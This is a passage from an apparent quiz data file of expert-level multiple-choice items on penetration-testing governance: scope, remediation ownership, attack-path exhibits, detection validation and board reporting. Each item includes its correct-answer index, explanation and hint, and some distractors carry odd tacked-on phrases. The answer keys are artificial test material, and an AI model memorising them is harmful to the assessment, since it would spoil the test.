    hint: "Quality and trust."
  },
  {
    id: 327, rank: 3, role: "pentest", topic: "Test Data Safety Exhibit", difficulty: "EXPERT",
    exhibit: "Test plan v2\nEnvironment: PRODUCTION (customer-db-prod)\nData: live customer records\nBackup before test: not required\nRollback plan: none\nWindow: business hours, no notification to operations",
    q: "What is the main issue in this test plan?",
    options: ["Testing with an agreed window, and contacts, then record the result in the ticket","Testing against production with real customer data and no rollback","Testing with a written stop condition, and review the outcome at the next monthly meeting","Testing against a clone with masked data"],
    correct: 1, why: "Production data and no rollback raise operational and privacy risk.",
    hint: "Production, real data."
  },
  {
    id: 328, rank: 3, role: "pentest", topic: "Remediation Governance", difficulty: "EXPERT",
    q: "What helps ensure findings are fixed within agreed timescales?",
    options: ["Named owners and due dates by severity with escalation","A report sent once with no follow-up","Delaying all fixes until the next audit","A general request to fix things when the teams have the time to look at it"],
    correct: 0, why: "Accountability and escalation drive closure.",
    hint: "Owners and dates."
  },
  {
    id: 329, rank: 3, role: "pentest", topic: "Residual Risk Reporting", difficulty: "EXPERT",
    q: "How should residual risk after remediation be reported?",
    options: ["What remains and why it was accepted and by whom","As the risk the previous team had","A statement that all risk has been removed, and that no further work is needed","No mention of the unresolved items and the report stays short, and positive"],
    correct: 0, why: "Residual risk must be visible and owned.",
    hint: "Visible and owned."
  },
  {
    id: 330, rank: 3, role: "pentest", topic: "Attack Path Review Exhibit", difficulty: "EXPERT",
    exhibit: "Path: phishing foothold (user PC) -> shared workstation (local admin: IT-Support group)\n-> cached domain admin token -> domain controller\nControls observed: no tiered admin, no credential guard, no restricted logon",
    q: "Which control would best break the path described in this diagram summary?",
    options: ["Adding a new colour to the intranet theme","Increasing the size of the log disk, and review the outcome at the next monthly meeting","Publishing the diagram to all staff, until the next scheduled review takes place","Removing the standing admin rights from the shared workstation"],
    correct: 3, why: "Cutting the privileged link removes the route to the domain controller.",
    hint: "Break the chain."
  },
  {
    id: 331, rank: 3, role: "pentest", topic: "Tiered Administration", difficulty: "EXPERT",
    q: "Why use tiered administration in a directory environment?",
    options: ["It keeps privileged credentials off lower-trust systems","It gives all staff domain admin rights","It removes the need for monitoring","It makes passwords shorter for administrators and they are easier to type quickly"],
    correct: 0, why: "Tiering limits credential theft impact.",
    hint: "Separate tiers."
  },
  {
    id: 332, rank: 3, role: "pentest", topic: "Assume Breach Planning", difficulty: "EXPERT",
    q: "Which statement BEST describes an assume-breach testing model?",
    options: ["It assumes the defenders are always successful","It starts with a foothold to test detection and response","It tests only the outer perimeter, and stops once that boundary has been checked","It starts by publishing the results first"],
    correct: 1, why: "The perimeter-only model is the runner-up as it is traditional, but it does not test what happens after an intruder gets in.",
    hint: "Start inside."
  },
  {
    id: 333, rank: 3, role: "pentest", topic: "Reporting to Regulators", difficulty: "EXPERT",
    q: "A regulator asks for evidence of independent testing. What is the best approach?",
    options: ["Provide an attestation, and summary while protecting technical detail, as soon as practical","Send only the invoice","Refuse to provide any information","Send the full technical report with every exploit detail, and revisit the decision after the next release"],
    correct: 0, why: "Summaries meet the need without exposing sensitive detail.",
    hint: "Attestation."
  },
  {
    id: 334, rank: 3, role: "pentest", topic: "Capacity Planning for Fixes", difficulty: "EXPERT",
    q: "Why involve engineering leaders when planning remediation after a major test?",
    options: ["They can remove findings that they dislike before the report goes to the auditors","They can approve a much shorter version of the report for the whole board to read","They can schedule fixes against capacity and dependencies","They can choose the font, and the cover page for the report that gets delivered"],
    correct: 2, why: "Fixes compete with other work and need planning.",
    hint: "Plan the work."
  },
  {
    id: 335, rank: 3, role: "pentest", topic: "Test Result Sharing", difficulty: "EXPERT",
    q: "How widely should detailed findings be shared inside the client?",
    options: ["Only with owners who need them and leaders in summary","On a public site for transparency","With nobody apart from the testers","With every employee through the staff newsletter that goes out each Friday morning"],
    correct: 0, why: "Need-to-know limits exposure of weaknesses.",
    hint: "Need to know."
  },
  {
    id: 336, rank: 3, role: "pentest", topic: "Control Validation Exhibit", difficulty: "EXPERT",
    exhibit: "Simulation set: 20 behaviours\nBlocked: 10   Alerted only: 6   No telemetry: 4\nPolicy: standard profile v3.2, tamper protection ON\nHosts: 25 corporate laptops",
    q: "What does this control test result show?",
    options: ["The control blocked every behaviour that the testers ran against the laptops all week","The control was never installed on any of the twenty-five laptops in the test group","The control blocked only half of the simulated behaviours","The control was disabled by policy on the laptops and and nothing was ever recorded"],
    correct: 2, why: "Partial blocking shows tuning gaps.",
    hint: "Blocked count."
  },
  {
    id: 337, rank: 3, role: "pentest", topic: "Security Champions Link", difficulty: "EXPERT",
    q: "How can a test programme support security champions in development teams?",
    options: ["Name and shame teams with the most findings","Send them the report, and nothing else","Share patterns, and run workshops on the most common issues, then record the result in the ticket","Prevent them from seeing any results"],
    correct: 2, why: "Education closes the feedback loop.",
    hint: "Teach patterns."
  },
  {
    id: 338, rank: 3, role: "pentest", topic: "Scope Creep Handling", difficulty: "EXPERT",
    q: "The client asks to add three systems mid-test. What is the best response?",
    options: ["Agree a written scope change covering time, cost and authorisation, in most cases","Add them informally, and hope the client pays later","Refuse any change under all circumstances","Test them quietly without telling anyone"],
    correct: 0, why: "Changes need documented authorisation.",
    hint: "Written change."
  },
  {
    id: 339, rank: 3, role: "pentest", topic: "Supply Chain Assessment", difficulty: "EXPERT",
    q: "Why include third-party connections in an assessment scope where permitted?",
    options: ["They are irrelevant to risk","They are tested by the provider only and the client does not need to look at them","They are always out of scope in every case as the contract never covers them","Trusted links can give attackers a path inward"],
    correct: 3, why: "Trusted connections are a real attack route.",
    hint: "Trust paths."
  },
  {
    id: 340, rank: 3, role: "pentest", topic: "Telemetry Quality", difficulty: "EXPERT",
    q: "Which logging gap most limits an investigation after an incident?",
    options: ["Too many analysts on the team who all want to review the same alerts at once","Too much storage space being available for the logs that the systems generate daily, as a general rule","Missing process, and login events on key systems, and revisit the decision after the next release","Too many colourful dashboards that distract the analysts during their normal shifts"],
    correct: 2, why: "Without key telemetry the sequence of events cannot be rebuilt.",
    hint: "Key events."
  },
  {
    id: 341, rank: 3, role: "pentest", topic: "Containment Playbook Exhibit", difficulty: "EXPERT",
    exhibit: "Playbook: Suspected malware on endpoint\n1. Confirm alert\n2. Disconnect host from the network\n3. Re-image the host\n4. Close the ticket\nOwners: SOC L2. Escalation: none defined",
    q: "What is the main weakness in this containment playbook?",
    options: ["It lists the contact details of the incident team members for every shift of the week","No step to preserve evidence before isolating hosts","It names decision makers for isolation and defines how serious each incident level is","It defines severity levels"],
    correct: 1, why: "Evidence preservation should be built into containment.",
    hint: "Evidence step."
  },
  {
    id: 342, rank: 3, role: "pentest", topic: "Metrics Misuse", difficulty: "EXPERT",
    q: "Why can counting the number of findings alone mislead leaders?",
    options: ["Because testers always find the same number of issues in every client they visit","Because findings never matter to leaders who only care about the cost of each test","Because the reports that the testers write are always too short to be understood","It ignores severity, context and whether issues were fixed"],
    correct: 3, why: "Counts without context hide risk.",
    hint: "Severity and context."
  },
  {
    id: 343, rank: 3, role: "pentest", topic: "Authorisation for Social Tests", difficulty: "EXPERT",
    q: "What additional safeguard is needed before testing staff with simulated lures?",
    options: ["Legal and HR approval and rules for handling individual results","Tell staff nothing and punish anyone who fails","Use pictures of colleagues' families","Use their private email addresses"],
    correct: 0, why: "HR and legal approval protects staff and the organisation.",
    hint: "HR and legal."
  },
  {
    id: 344, rank: 3, role: "pentest", topic: "Program Maturity Model", difficulty: "EXPERT",
    q: "What does a more mature assurance programme usually do differently?",
    options: ["Runs a single test once a year only, and it can satisfy the compliance auditors","Tests only what is easy","Avoids sharing findings with the system owners who would have to fix the problems","Tests continuously against threats and tracks fixes"],
    correct: 3, why: "Maturity means continuous, threat-informed and outcome-driven work.",
    hint: "Continuous."
  },
  {
    id: 345, rank: 3, role: "pentest", topic: "Zero Trust Test Findings", difficulty: "EXPERT",
    q: "A test shows that internal users could reach every server. Which recommendation fits zero trust?",
    options: ["Remove access logging","Trust all users on the corporate network","Enforce identity, and device-based access to each application","Share admin passwords"],
    correct: 2, why: "Access should be decided per request.",
    hint: "Per-request."
  },
  {
    id: 346, rank: 3, role: "pentest", topic: "Evidence for Insurers", difficulty: "EXPERT",
    q: "Which evidence best supports a cyber insurance application about security testing?",
    options: ["A photograph of the server room that shows the new racks, and the cooling equipment","A verbal promise from the manager that the testing was done at some earlier point","A list of the security tools that the company has purchased over the last few years","Dated testing summaries and closure of critical findings"],
    correct: 3, why: "Insurers value dated evidence and remediation.",
    hint: "Dated evidence."
  },
  {
    id: 347, rank: 3, role: "pentest", topic: "Segmentation Verification", difficulty: "EXPERT",
    q: "How can a client BEST verify that segmentation rules work as intended?",
    options: ["Review the diagram once, and assume the rules are right","Test allowed and blocked paths between zones regularly","Trust the vendor documentation","Count the number of firewall rules, and revisit the decision after the next release"],
    correct: 1, why: "Reviewing a diagram is the runner-up as it is quick, but it does not show the real behaviour of the rules.",
    hint: "Test the paths."
  },
  {
    id: 348, rank: 3, role: "pentest", topic: "Resilience Exercise Exhibit", difficulty: "EXPERT",
    exhibit: "Tabletop: ransomware on file servers\nObservations:\n- Incident commander not named\n- Authority to isolate payment systems unclear (3 people assumed another would decide)\n- Contact list out of date for 5 of 12 roles\n- Backup restore time unknown",
    q: "Which finding from this tabletop exercise needs urgent attention?",
    options: ["Everyone knew the escalation contacts and the plan had been tested the month before","Nobody knows who may approve isolating a key system","The legal team joined the exercise on time and kept a record of the decisions made","The plan was tested last month and the contact list was reviewed by all the owners"],
    correct: 1, why: "Unclear decision authority delays containment.",
    hint: "Who decides?"
  },
  {
    id: 349, rank: 3, role: "pentest", topic: "Cloud Test Programme", difficulty: "EXPERT",
    q: "How should a testing programme change when most workloads move to the cloud?",
    options: ["Add configuration and identity reviews and respect provider rules","Test only the physical data centre","Stop all testing as the provider is responsible","Ignore identities and permissions"],
    correct: 0, why: "Cloud risk centres on configuration and identity.",
    hint: "Config and identity."
  },
  {
    id: 350, rank: 3, role: "pentest", topic: "Finding Deduplication", difficulty: "EXPERT",
    q: "Why deduplicate findings across several tools before reporting?",
    options: ["To avoid having to validate any of the results that the different tools produce at all","To give owners one item to fix instead of many copies","To hide the critical issues among all of the minor ones that tools tend to report","To make the total number of findings look larger when the board reviews the report"],
    correct: 1, why: "Duplicates waste time and distort metrics.",
    hint: "One issue, one item."
  },
  {
    id: 351, rank: 3, role: "pentest", topic: "Risk Appetite Alignment", difficulty: "EXPERT",
    q: "How should testing results be aligned with risk appetite?",
    options: ["Ignore appetite and treat all findings equally","Let testers set the appetite, until the next scheduled review takes place","Compare finding severity with agreed thresholds and escalate breaches","Hide findings above appetite"],
    correct: 2, why: "Thresholds determine escalation.",
    hint: "Thresholds."
  },
  {
    id: 352, rank: 3, role: "pentest", topic: "Quality Assurance of Testers", difficulty: "EXPERT",
    q: "How can a firm best maintain consistent test quality across teams?",
    options: ["Use shared methodology, peer review and training","Let each tester do whatever they prefer","Copy old reports, then record the result in the ticket","Avoid reviews to save time"],
    correct: 0, why: "Methods and review support consistency.",
    hint: "Method and review."
  },
  {
    id: 353, rank: 3, role: "pentest", topic: "Legacy Systems Findings", difficulty: "EXPERT",
    q: "A critical system cannot be patched because it is end-of-life. What is the best recommendation?",
    options: ["Publish it to the internet for support","Disable all monitoring on it","Isolate it with compensating controls, and plan its replacement","Ignore it until it fails"],
    correct: 2, why: "Compensating controls reduce risk while replacement is planned.",
    hint: "Isolate and plan."
  },
  {
    id: 354, rank: 3, role: "pentest", topic: "Privacy Impact in Testing", difficulty: "EXPERT",
    q: "Why involve the privacy officer in planning large tests?",
    options: ["To approve the holiday requests of the testers while they are working at the client","To shorten the test, and the testers can finish the work well before the deadline","To avoid having to write a report as the privacy rules cover all of the work","To handle personal data seen during testing lawfully"],
    correct: 3, why: "Testing can expose personal data and needs legal handling.",
    hint: "Personal data."
  },
  {
    id: 355, rank: 3, role: "pentest", topic: "Closing the Loop", difficulty: "EXPERT",
    q: "What is the best indicator that a testing programme feeds engineering improvement?",
    options: ["The report was filed in a folder","The report had a nice cover","Pipeline checks and standards updated after each test","The test took less time than planned"],
    correct: 2, why: "Improvements show that lessons were acted on.",
    hint: "Lessons applied."
  },
  {
    id: 356, rank: 3, role: "pentest", topic: "Incident vs Test Distinction", difficulty: "EXPERT",
    q: "How can responders tell a planned test from a real attack when deconfliction fails?",
    options: ["Assume it is only a test","Turn off monitoring","Follow the incident process, and verify with the engagement contact","Ignore the alert"],
    correct: 2, why: "Treat as real until verified.",
    hint: "Treat as real."
  },
  {
    id: 357, rank: 3, role: "pentest", topic: "Reporting Cadence", difficulty: "EXPERT",
    q: "How often should leaders receive a testing and remediation update?",
    options: ["Once every five years when the audit committee next reviews the security programme","Regularly with trends and escalation of overdue items","Never unless a senior leader happens to ask for it during one of the meetings","Only after an incident has already happened, and caused damage to the organisation"],
    correct: 1, why: "Regular updates keep risk visible.",
    hint: "Regular."
  },
  {
    id: 358, rank: 3, role: "pentest", topic: "Pivot Exposure Exhibit", difficulty: "EXPERT",
    exhibit: "svc-backup, svc-report, svc-web share one password (age 1,430 days)\nMember of: Domain Admins\nInteractive logon: allowed on all servers\nPassword never expires: true",
    q: "Which recommendation best addresses this finding about service accounts?",
    options: ["Disable the audit log for those accounts","Keep the shared password and rotate it annually, as soon as practical","Use managed accounts with unique secrets and restricted logon rights","Give the accounts domain admin for simplicity"],
    correct: 2, why: "Unique, restricted accounts limit lateral movement.",
    hint: "Unique and restricted."
  },
  {
    id: 359, rank: 3, role: "pentest", topic: "Escalation Criteria", difficulty: "EXPERT",
    q: "Which criterion best triggers escalation of a finding during a test?",
    options: ["A finding that has a very long title, and that nobody on the team has seen before","A finding that was reported by a tool that the testers were not familiar with yet","A finding that was discovered on a Friday afternoon just before the weekend began","Evidence of active compromise or serious harm"],
    correct: 3, why: "Critical exposure or active compromise warrants immediate escalation.",
    hint: "Immediate harm."
  },
  {
    id: 360, rank: 3, role: "pentest", topic: "Testing Independence", difficulty: "EXPERT",
    q: "Why should some testing be independent of the team that built the system?",
    options: ["To increase the number of meetings that the builders, and the testers have to attend weekly","To make the test cheaper for the client, and more teams can afford to use it each year","To avoid having to produce any report as independent testers only talk to managers","To reduce bias and bring a fresh view"],
    correct: 3, why: "Independence reduces blind spots.",
    hint: "Fresh view."
  },
  {
    id: 361, rank: 4, role: "pentest", topic: "Assurance Strategy", difficulty: "EXPERT",
    q: "A board asks how to get independent assurance across the whole security programme. What is the BEST approach?",
    options: ["A self-assessment filled in by the teams that run the controls, as a general rule","A purchase of the most expensive scanning platform available, in most cases","A single annual penetration test of the public website only","A layered plan that mixes testing, control audits and exercises"],
    correct: 3, why: "A single annual test is the runner-up as it is independent, but it covers a narrow slice of the programme and a single point in time.",
    hint: "Layered."
  },
  {
    id: 362, rank: 4, role: "pentest", topic: "Adversary Emulation Governance", difficulty: "EXPERT",
    q: "What should a mature governance model require before an adversary emulation starts?",
    options: ["Permission from the testers themselves and from no other person in the company","A promise that no system will be touched under any circumstance","Approved objectives, risk limits and a stop authority, as a general rule","A plan to keep the whole security team unaware for the full year, in most cases"],
    correct: 2, why: "Clear authorisation and control limits keep the exercise safe and lawful.",
    hint: "Authority and limits."
  },
  {
    id: 363, rank: 4, role: "pentest", topic: "Emulation Results Exhibit", difficulty: "EXPERT",
    exhibit: "Objective: reach finance file server\nDetected: yes (after 6 h; target 2 h)\nContained: after 31 h (target 8 h)\nObjective achieved by red team: yes at hour 19\nLogs available: complete; playbook followed: partly",
    q: "What is the most important conclusion from this exercise summary?",
    options: ["No activity was observed by the monitoring team at any point","Detection improved but containment still misses its target, in most cases","Detection and containment both exceeded every target that was set before the work","The exercise was cancelled before any objective was attempted"],
    correct: 1, why: "Containment time remains above the target and needs process work.",
    hint: "Compare to target."
  },
  {
    id: 364, rank: 4, role: "pentest", topic: "Risk Quantification", difficulty: "EXPERT",
    q: "Which approach best makes testing results useful for financial decisions?",
    options: ["Estimate loss ranges for the scenarios the findings enable","List the raw technical findings without any further business context at all","Report only the number of hosts that were scanned in total","Give each finding a colour and discuss it at the meeting"],
    correct: 0, why: "Loss scenarios let leaders compare risk and investment.",
    hint: "Express as loss."
  },
  {
    id: 365, rank: 4, role: "pentest", topic: "Programme Independence", difficulty: "EXPERT",
    q: "How can a security testing function preserve independence inside the organisation?",
    options: ["Let each system owner approve the final wording of the findings before release","Report to a leader outside the tested teams, as a general rule","Share all of the reports with the vendors being assessed first","Report to the head of the team whose systems are the subject of the testing"],
    correct: 1, why: "Independent reporting lines prevent pressure on results.",
    hint: "Reporting line."
  },
  {
    id: 366, rank: 4, role: "pentest", topic: "Continuous Control Validation", difficulty: "EXPERT",
    q: "Why validate security controls continuously rather than only once a year?",
    options: ["Controls drift as things change and gaps open silently","Controls never change, and annual checks are enough for every kind of environment","Continuous checks guarantee that no attacker can succeed","Continuous checks remove the need for any monitoring staff"],
    correct: 0, why: "Change and drift create gaps between assessments.",
    hint: "Drift."
  },
  {
    id: 367, rank: 4, role: "pentest", topic: "Detection Engineering Pipeline", difficulty: "EXPERT",
    q: "What is the best way to turn exercise findings into lasting detection improvements?",
    options: ["Wait for the next real incident to learn which rules matter, and review the outcome at the next monthly meeting","Brief the analysts once, and trust them to remember it","Print the report and place it in the SOC meeting room","Write and test detections then track them in a detection backlog"],
    correct: 3, why: "Tracked, tested detections persist beyond the exercise.",
    hint: "Backlog."
  },
  {
    id: 368, rank: 4, role: "pentest", topic: "Boundary Review Exhibit", difficulty: "EXPERT",
    exhibit: "Corporate LAN 10.10.0.0/16  Payment LAN 10.10.0.0/16 (same routing domain)\nFirewall between zones: none\nJump host for payment admin: none\nFlow logging: disabled",
    q: "Which design weakness is shown by this network summary?",
    options: ["Separate zones with a firewall, and logging between them that the team reviews","A flat network where two zones share routing, in most cases","A restricted management network that requires MFA for every administrator login","An isolated backup network with immutable storage"],
    correct: 1, why: "Shared routing between sensitive and general zones removes segmentation.",
    hint: "Flat network."
  },
  {
    id: 369, rank: 4, role: "pentest", topic: "Responsible Use of Findings", difficulty: "EXPERT",
    q: "An executive wants to use test findings to blame a team publicly. What is the best response?",
    options: ["Remove the findings, and nobody is embarrassed","Frame findings around systems and processes and avoid blaming people","Support the blame, and the team improves faster","Publish the names of the engineers who wrote the code, and revisit the decision after the next release"],
    correct: 1, why: "A blame-free approach keeps teams cooperative.",
    hint: "No blame."
  },
  {
    id: 370, rank: 4, role: "pentest", topic: "Test Programme Funding", difficulty: "EXPERT",
    q: "The CFO wants to cut the testing budget by half. What is the BEST argument?",
    options: ["Threaten to resign if the budget is cut at all","State that testing is always required without explanation","Show the risk reduction and the cost of the incidents prevented","Offer to run the same tests with fewer people, and no review, where that is practical"],
    correct: 2, why: "Stating requirement alone is the runner-up as it is simple, but it gives no evidence of value for the CFO to weigh.",
    hint: "Value evidence."
  },
  {
    id: 371, rank: 4, role: "pentest", topic: "Legal Privilege Handling", difficulty: "EXPERT",
    q: "Why might a client route a test through legal counsel in some situations?",
    options: ["To avoid ever fixing them","To cut the report cost","To delay the start date","To protect the confidentiality of sensitive findings where the law allows"],
    correct: 3, why: "Privilege may protect sensitive analysis from disclosure.",
    hint: "Confidentiality."
  },
  {
    id: 372, rank: 4, role: "pentest", topic: "Exposure Management", difficulty: "EXPERT",
    q: "What does continuous exposure management add beyond periodic testing?",
    options: ["A replacement for the incident response team that handles real attacks every day","A way to avoid asset inventories","A promise that no weakness will ever exist again once the platform is installed","A live view of assets, weaknesses and attack paths"],
    correct: 3, why: "It combines discovery, prioritisation and validation continuously.",
    hint: "Live view."
  },
  {
    id: 373, rank: 4, role: "pentest", topic: "Control Failure Exhibit", difficulty: "EXPERT",
    exhibit: "Privileged access requests (last 90 days): 112 approved\nAccess granted with expiry: 0\nAccounts with admin rights older than 180 days: 74\nReview of standing access: not performed",
    q: "What does this control assessment show about the privileged access process?",
    options: ["Approvals exist but standing access is never removed","Access is removed automatically after each approved task","No privileged access exists in the company","All approvals are denied by default"],
    correct: 0, why: "Standing privilege defeats the purpose of approvals.",
    hint: "Look at expiry."
  },
  {
    id: 374, rank: 4, role: "pentest", topic: "Third-Party Assurance", difficulty: "EXPERT",
    q: "How should a company gain assurance on a critical supplier's security?",
    options: ["Trust the supplier's marketing brochure completely, as a first step","Ask the supplier whether they feel secure, until the next scheduled review takes place","Check only that the invoice is paid on time","Contractual testing rights, evidence review and joint remediation"],
    correct: 3, why: "Evidence and contractual rights give confidence.",
    hint: "Evidence and rights."
  },
  {
    id: 375, rank: 4, role: "pentest", topic: "Maturity Roadmap Exhibit", difficulty: "EXPERT",
    exhibit: "Year 1: 3 tests, 142 findings   Year 2: 4 tests, 151 findings (62% repeat)\nMean time to detect: 9 days   Mean time to contain: 14 days\nDetection rules added after tests: 3\nIncident response exercises: 0",
    q: "Which next step does this roadmap summary suggest is the highest priority?",
    options: ["Replace the incident response team, and review the outcome at the next monthly meeting","Stop testing until the next financial year, and revisit the decision after the next release","Improve detection and response before adding further offensive tests","Run more tests to find more of the same issues"],
    correct: 2, why: "Repeated tests that find the same issues add little until detection is improved.",
    hint: "Same issues again."
  },
  {
    id: 376, rank: 4, role: "pentest", topic: "Strategic Metrics", difficulty: "EXPERT",
    q: "Which metric best shows security testing is improving organisational resilience?",
    options: ["Rising number of tests purchased, until the next scheduled review takes place","More slides in the board pack","More pages in each report","Declining time to detect and contain simulated attacks"],
    correct: 3, why: "Resilience shows in faster detection and containment.",
    hint: "Speed of response."
  },
  {
    id: 377, rank: 4, role: "pentest", topic: "Emergent Technology Testing", difficulty: "EXPERT",
    q: "How should testing approach a new technology such as an AI-enabled service?",
    options: ["Use the same checklist without any adaptation","Adapt the methodology to the new risks and involve specialists","Avoid testing it until it is old","Ask the vendor to approve every finding first, in the first instance"],
    correct: 1, why: "New technology brings new risks that need suitable methods.",
    hint: "Adapt."
  },
  {
    id: 378, rank: 4, role: "pentest", topic: "Offensive Security Ethics", difficulty: "EXPERT",
    q: "Which principle best guides ethical conduct in security testing?",
    options: ["Do anything that is possible if it helps the client","Keep any discovered flaws for personal use","Share client data with the community","Act only within authorisation and protect the client and the public"],
    correct: 3, why: "Ethics rest on authorisation, confidentiality and minimising harm.",
    hint: "Authorisation."
  },
  {
    id: 379, rank: 4, role: "pentest", topic: "Incident Lessons Exhibit", difficulty: "EXPERT",
    exhibit: "Timeline: attacker used the remote management tool from day 1\nAlerts: 0 (tool is allow-listed and logs not forwarded)\nDwell time: 23 days\nAction items: forward management tool logs; build detection for out-of-hours use",
    q: "What does this post-incident review suggest was missing before the incident?",
    options: ["A new office building for the security team to use for their weekly planning meetings","More staff in the marketing team to write about the security programme to customers","A faster internet connection for the analysts who watch the alerts around the clock","A tested detection for abuse of an admin tool"],
    correct: 3, why: "The abuse of trusted tools went unnoticed because no detection existed.",
    hint: "What went unseen?"
  },
  {
    id: 380, rank: 4, role: "pentest", topic: "Findings Backlog Management", difficulty: "EXPERT",
    q: "A large backlog of old findings has built up. What is the BEST way to reduce it?",
    options: ["Add every finding to the next budget bid, and revisit the decision after the next release","Close all of the oldest findings automatically","Prioritise by risk and fix root causes with agreed owners and dates","Hide the backlog from the board"],
    correct: 2, why: "Closing the oldest is the runner-up as it clears the list quickly, but old findings can still be the most dangerous.",
    hint: "Risk and root cause."
  },
  {
    id: 381, rank: 4, role: "pentest", topic: "Board Reporting", difficulty: "EXPERT",
    q: "What should a board report on testing emphasise?",
    options: ["Only the positive results","The brand names of tools","Trends, key risks, decisions needed and progress against targets","Every technical detail"],
    correct: 2, why: "Boards need decision-ready information.",
    hint: "Decisions."
  },
  {
    id: 382, rank: 4, role: "pentest", topic: "Deception Technology", difficulty: "EXPERT",
    q: "How can deception assets such as decoy accounts help defenders?",
    options: ["They speed up the production network as decoys take load away from servers","They remove the need for patching as the decoys confuse every attacker well","They give high-confidence alerts when touched","They replace all of the other monitoring tools that the security team has today"],
    correct: 2, why: "Decoys have no legitimate use so any touch is suspicious.",
    hint: "High-confidence alerts."
  },
  {
    id: 383, rank: 4, role: "pentest", topic: "Detection Validation Exhibit", difficulty: "EXPERT",
    exhibit: "Rule: suspicious service creation    Status: enabled\nSimulated events: 12   Alerts fired: 0\nLog source: Windows System log (hosts: 0 of 400 forwarding event 7045)\nLast data received: 41 days ago",
    q: "What is the best interpretation of this validation run?",
    options: ["Rules exist but the data source is missing so alerts cannot fire","The rules fired correctly on every simulated event","The rules were deleted before the run","The simulation was never run"],
    correct: 0, why: "A missing log source silently breaks a detection.",
    hint: "Telemetry missing."
  },
  {
    id: 384, rank: 4, role: "pentest", topic: "Metrics for Detection Quality", difficulty: "EXPERT",
    q: "Which measure best shows quality of a detection rule?",
    options: ["True positives against false positives, and coverage of the technique","The words in the rule description","The age of the rule","The name of the engineer"],
    correct: 0, why: "Precision and coverage reflect rule value.",
    hint: "Precision."
  },
  {
    id: 385, rank: 4, role: "pentest", topic: "Crisis Communication", difficulty: "EXPERT",
    q: "In a major incident found during a test, who should be informed first?",
    options: ["The competitors","The public on social media","The designated incident lead and the client contact in the agreed channel","All suppliers at once"],
    correct: 2, why: "Use the agreed escalation path.",
    hint: "Agreed path."
  },
  {
    id: 386, rank: 4, role: "pentest", topic: "Cost of Over-Testing", difficulty: "EXPERT",
    q: "What is the main risk of running too many overlapping tests?",
    options: ["Alert fatigue and fix capacity used on duplicate findings","Not enough findings being reported to keep the remediation teams busy in the year","Too few security tools being available to the team to run all of the planned tests","Too little interest from attackers as the testing makes the company less visible"],
    correct: 0, why: "Duplicate effort wastes scarce remediation capacity.",
    hint: "Capacity."
  },
  {
    id: 387, rank: 4, role: "pentest", topic: "Open Source Dependencies", difficulty: "EXPERT",
    q: "What is the best programme-level response to a widespread library flaw?",
    options: ["Ask developers to guess where it is used","Use an inventory to find all uses and coordinate fixes, and checks, until the next scheduled review takes place","Remove the library name from documents","Wait until the vendor contacts each team"],
    correct: 1, why: "An inventory lets the organisation respond quickly.",
    hint: "Inventory."
  },
  {
    id: 388, rank: 4, role: "pentest", topic: "Ransomware Readiness Exhibit", difficulty: "EXPERT",
    exhibit: "Domain admin logons on workstations (30 days): 212\nBackup server joined to domain, same admin group\nOffline backup copy: none\nEDR coverage servers: 91%   Last full restore test: never",
    q: "Which gap in this readiness review most increases ransomware impact?",
    options: ["Domain admin credentials are used on user workstations and backups share them","EDR covers all servers","Admin logons use jump hosts","Backups are offline, and tested"],
    correct: 0, why: "Shared credentials let one compromise reach backups and servers.",
    hint: "Credential reuse."
  },
  {
    id: 389, rank: 4, role: "pentest", topic: "Metrics Gaming Risk", difficulty: "EXPERT",
    q: "Why can targets such as 'close 90 percent of findings' be gamed?",
    options: ["They encourage honest reporting only as nobody would ever try to change the figures","Teams can close easy items while serious ones stay open","They always improve the real risk as teams work hard to meet every set target","They cannot be gamed in any way as the numbers are collected by an automatic system"],
    correct: 1, why: "Poorly designed metrics reward the wrong behaviour.",
    hint: "Perverse incentive."
  },
  {
    id: 390, rank: 4, role: "pentest", topic: "Knowledge Management", difficulty: "EXPERT",
    q: "How can a test team preserve lessons from past engagements?",
    options: ["Rely on memory alone","Keep sanitised lessons and patterns in a shared knowledge base","Keep notes on personal laptops only","Delete notes after each project"],
    correct: 1, why: "Sanitised shared knowledge improves future work.",
    hint: "Sanitised sharing."
  },
  {
    id: 391, rank: 4, role: "pentest", topic: "Tabletop Design", difficulty: "EXPERT",
    q: "What makes a tabletop exercise valuable for leaders?",
    options: ["Only technical staff taking part and the leaders are not asked to make decisions","A long slide deck from the facilitator that explains each stage in full detail first","Realistic decisions and recorded follow-up actions","No notes being taken and people feel free to speak without worrying about records"],
    correct: 2, why: "Decisions and actions drive improvement.",
    hint: "Decisions and actions."
  },
  {
    id: 392, rank: 4, role: "pentest", topic: "Attack Path Management", difficulty: "EXPERT",
    q: "How does attack path management help prioritise fixes?",
    options: ["It finds the few weaknesses that link to critical assets","It ignores the value of the assets, and treats every weakness as the same risk to all","It replaces patching entirely","It lists every weakness equally, and leaves the teams to work out which one to fix first"],
    correct: 0, why: "Fixing choke points reduces many paths at once.",
    hint: "Choke points."
  },
  {
    id: 393, rank: 4, role: "pentest", topic: "Regulatory Alignment", difficulty: "EXPERT",
    q: "How can a testing programme support financial regulation on operational resilience?",
    options: ["Evidence of testing against important business services","By avoiding testing of the critical services, and nothing can go wrong for the firm","By reporting results only to the testers, and no one else has to read the long report","By testing only systems that hold no data, and no regulator can ask about the results"],
    correct: 0, why: "Regulations focus on resilience of important services.",
    hint: "Important services."
  },
  {
    id: 394, rank: 4, role: "pentest", topic: "Retention of Test Evidence", difficulty: "EXPERT",
    q: "How long should detailed test evidence be retained?",
    options: ["Until the next lunch","Forever on removable media","Only as long as the contract and law require then be securely destroyed","Until the testers leave"],
    correct: 2, why: "Retain minimally and dispose securely.",
    hint: "Minimal retention."
  },
  {
    id: 395, rank: 4, role: "pentest", topic: "Cloud Exposure Review Exhibit", difficulty: "EXPERT",
    exhibit: "Public shares found: 17\nWith documented owner: 2\nWith business justification: 1\nLast review date: none\nContains personal data: 6 shares",
    q: "What does this review of exposed storage show about governance?",
    options: ["Owners approve every share, and the approvals are recorded in the ticketing system for audit","No owner or review exists for public data shares","Public shares are blocked by policy, and exceptions need a signed approval from the CISO","All shares are reviewed every quarter, and each one has a business justification on file"],
    correct: 1, why: "Unowned public shares point to missing governance.",
    hint: "Owner?"
  },
  {
    id: 396, rank: 4, role: "pentest", topic: "Talent and Skills", difficulty: "EXPERT",
    q: "What is a sound way to build capability in a testing function?",
    options: ["Prevent them sharing knowledge, then record the result in the ticket","Mix of training, mentoring, peer review and rotation","Hire one person, and leave them alone","Avoid training to save money"],
    correct: 1, why: "Capability grows through practice and review.",
    hint: "Mentoring and review."
  },
  {
    id: 397, rank: 4, role: "pentest", topic: "Aligning with Frameworks", difficulty: "EXPERT",
